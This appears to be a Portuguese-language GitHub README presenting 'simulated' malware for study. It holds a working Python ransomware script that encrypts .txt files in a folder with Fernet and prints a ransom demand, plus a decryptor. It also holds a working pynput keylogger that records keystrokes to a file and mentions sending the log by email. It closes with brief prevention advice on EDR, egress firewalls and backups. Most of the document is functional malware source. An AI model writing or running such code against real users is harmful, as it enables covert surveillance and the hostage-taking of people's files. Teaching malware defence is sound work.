# Ransoware_simulado-Criptografia-de-arquivos-

pré-requisitos:instale a biblioteca com o comando (pip install cryptography).
###########################################
import os
from cryptography.fernet import Fernet

# 1. Gera ou carrega uma chave de criptografia
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as key_file:
        key_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

# 2. Criptografa arquivos em uma pasta específica
def sequestrar_arquivos(diretorio):
    chave = carregar_chave()
    f = Fernet(chave)
    
    for arquivo in os.listdir(diretorio):
        if arquivo.endswith(".txt"): # Simula apenas arquivos de texto
            caminho = os.path.join(diretorio, arquivo)
            with open(caminho, "rb") as file:
                dados = file.read()
            
            dados_criptografados = f.encrypt(dados)
            
            with open(caminho, "wb") as file:
                file.write(dados_criptografados)
    
    print("Arquivos sequestrados! Pague o resgate (ou use a chave).")

# 3. Função de recuperação
def descriptografar(diretorio):
    chave = carregar_chave()
    f = Fernet(chave)
    for arquivo in os.listdir(diretorio):
        if arquivo.endswith(".txt"):
            caminho = os.path.join(diretorio, arquivo)
            with open(caminho, "rb") as file:
                dados_crip = file.read()
            dados_originais = f.decrypt(dados_crip)
            with open(caminho, "wb") as file:
                file.write(dados_originais)
    print("Arquivos recuperados.")

# Execução (Crie uma pasta chamada 'meus_testes' com alguns .txt dentro)
# gerar_chave()
# sequestrar_arquivos('meus_testes')


2. Keylogger Simulado
Este script registra o que é digitado. Para o envio de e-mail, recomendo usar uma biblioteca como yagmail, mas aqui focaremos na captura.
Pré-requisito instale a biblioteca pip install pynput.

from pynput.keyboard import Listener

log_file = "log_teclas.txt"

def on_press(key):
    # Converte a tecla para string e limpa as aspas
    tecla = str(key).replace("'", "")
    
    # Tratamento de teclas especiais para melhor leitura
    if tecla == "Key.space":
        tecla = " "
    elif tecla == "Key.enter":
        tecla = "\n"
    elif "Key" in tecla:
        tecla = f" [{tecla}] "

    with open(log_file, "a") as f:
        f.write(tecla)

# Inicia o monitoramento
print("Keylogger rodando... Pressione Ctrl+C no terminal para parar.")
with Listener(on_press=on_press) as listener:
    listener.join()

3. Prevenção
Prevenção: Uso de Antivírus/EDR que detectam chamadas de sistema estranhas (como criptografia em massa).
Firewall: Bloqueio de conexões de saída suspeitas (o que impediria o Keylogger de enviar o log).
Backup (3-2-1): A única defesa 100% eficaz contra Ransomware real

<img width="635" height="635" alt="Captura de tela_2026-03-18_15-28-13" src="https://github.com/user-attachments/assets/2bf8c8f9-3c99-4a1f-906a-ae2d9ba7b2ff" />


